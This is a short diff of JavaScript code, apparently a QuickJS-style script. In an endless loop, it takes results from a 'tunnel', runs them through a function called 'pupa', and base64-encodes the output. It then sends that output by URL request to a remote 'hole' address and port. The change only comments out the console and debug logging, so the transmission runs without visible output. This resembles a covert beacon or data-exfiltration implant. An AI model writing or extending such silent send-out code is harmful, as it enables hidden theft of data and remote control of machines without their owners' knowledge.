@@ -15,11 +15,11 @@ for(;;) {
   tunnel( function(res) {
     let sendBack = true;
     let feedback = pupa(res);
-console.log("End pupa");
-console.log(`[DEBUG]${hole.address}:${hole.port}/${base64("e", feedback)}`);
+//console.log("End pupa");
+//console.log(`[DEBUG]${hole.address}:${hole.port}/${base64("e", feedback)}`);
 
-    console.log(feedback);
-    feedback && sendBack ? std.urlGet(`${hole.address}:${hole.port}/base64:${base64("e", feedback)}`) : console.log(`Closing`);
+    //console.log(feedback);
+    feedback && sendBack ? std.urlGet(`${hole.address}:${hole.port}/base64:${base64("e", feedback)}`) : /*console.log(`Closing`)*/ 0;
   });
 }
 
